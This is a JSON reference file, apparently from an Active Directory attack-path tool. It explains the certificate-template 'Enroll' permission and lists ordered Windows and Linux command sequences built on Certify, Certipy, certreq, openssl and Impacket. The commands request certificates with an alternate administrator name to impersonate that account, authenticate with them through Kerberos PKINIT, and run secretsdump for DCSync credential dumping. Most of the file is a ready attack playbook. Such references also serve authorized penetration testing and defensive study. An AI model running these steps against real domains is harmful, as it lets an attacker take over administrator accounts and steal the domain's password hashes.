{
    "Enroll": {
        "meaning": "The Enroll permission grants enrollment rights on the certificate template. The target node may be a Certificate Template or an Enterprise Certification Authority. The following additional requirements must be met for a principal to be able to enroll a certificate: 1. The certificate template is published on an enterprise CA, 2. The principal has Enroll permission on the enterprise CA, 3. The principal meets the issuance requirements and the requirements for subject name and subject alternative name defined by the template.",
        "common": "",
        "windows": {
            "Certify_Enrollment": [
                {
                    "order": 1,
                    "command": "Certify.exe find /vulnerable",
                    "description": "Identify vulnerable certificate templates with enrollment permissions"
                },
                {
                    "order": 2,
                    "command": "Certify.exe request /ca:SERVER\\CA-NAME /template:TEMPLATE",
                    "description": "Request certificate using Certify with enrollment permissions"
                },
                {
                    "order": 3,
                    "command": "Certify.exe request /ca:SERVER\\CA-NAME /template:TEMPLATE /altname:administrator@domain.com",
                    "description": "Request certificate with alternative name for impersonation (if template allows)"
                }
            ],
            "Native_Certificate_Request": [
                {
                    "order": 1,
                    "command": "certreq -new template.inf request.req",
                    "description": "Create certificate request using Windows native tools"
                },
                {
                    "order": 2,
                    "command": "certreq -submit -config SERVER\\CA-NAME request.req certificate.cer",
                    "description": "Submit certificate request to CA for enrollment"
                },
                {
                    "order": 3,
                    "command": "certreq -accept certificate.cer",
                    "description": "Install enrolled certificate into local certificate store"
                }
            ],
            "PowerShell_Enrollment": [
                {
                    "order": 1,
                    "command": "Get-Certificate -Template TEMPLATE -CertStoreLocation Cert:\\CurrentUser\\My",
                    "description": "Request certificate using PowerShell with enrollment permissions"
                },
                {
                    "order": 2,
                    "command": "Request-Certificate -Template TEMPLATE -CertStoreLocation Cert:\\CurrentUser\\My -SubjectName 'CN=username'",
                    "description": "Request certificate with specific subject name using PowerShell"
                },
                {
                    "order": 3,
                    "command": "# Use enrolled certificate for authentication or further attacks",
                    "description": "Leverage enrolled certificate for authentication or privilege escalation"
                }
            ]
        },
        "linux": {
            "Certipy_Enrollment": [
                {
                    "order": 1,
                    "command": "certipy find -u USER@CORP.LOCAL -p PWD -dc-ip DC_IP",
                    "description": "Discover certificate templates and enrollment permissions"
                },
                {
                    "order": 2,
                    "command": "certipy req -u USER@CORP.LOCAL -p PWD -ca CA-NAME -target SERVER -template TEMPLATE",
                    "description": "Request certificate using Certipy with enrollment permissions"
                },
                {
                    "order": 3,
                    "command": "certipy req -u USER@CORP.LOCAL -p PWD -ca CA-NAME -target SERVER -template TEMPLATE -upn administrator@domain.com",
                    "description": "Request certificate with UPN for impersonation (if template allows)"
                }
            ],
            "Manual_Certificate_Request": [
                {
                    "order": 1,
                    "command": "openssl genrsa -out private.key 2048",
                    "description": "Generate private key for certificate request"
                },
                {
                    "order": 2,
                    "command": "openssl req -new -key private.key -out request.csr -subj '/CN=username'",
                    "description": "Create certificate signing request with specified subject"
                },
                {
                    "order": 3,
                    "command": "# Submit CSR to ADCS web enrollment interface or via RPC",
                    "description": "Submit certificate request using web enrollment or API"
                }
            ],
            "Certificate_Authentication": [
                {
                    "order": 1,
                    "command": "certipy auth -pfx certificate.pfx -username USER@CORP.LOCAL -domain CORP.LOCAL -dc-ip DC_IP",
                    "description": "Authenticate using enrolled certificate via Kerberos PKINIT"
                },
                {
                    "order": 2,
                    "command": "getTGT.py -cert-pfx certificate.pfx -dc-ip DC_IP CORP.LOCAL/USER",
                    "description": "Request TGT using certificate authentication with Impacket"
                },
                {
                    "order": 3,
                    "command": "export KRB5CCNAME=user.ccache && secretsdump.py -k -no-pass CORP.LOCAL/USER@DC.CORP.LOCAL",
                    "description": "Use certificate-obtained TGT for further attacks like DCSync"
                }
            ]
        }
    }
}
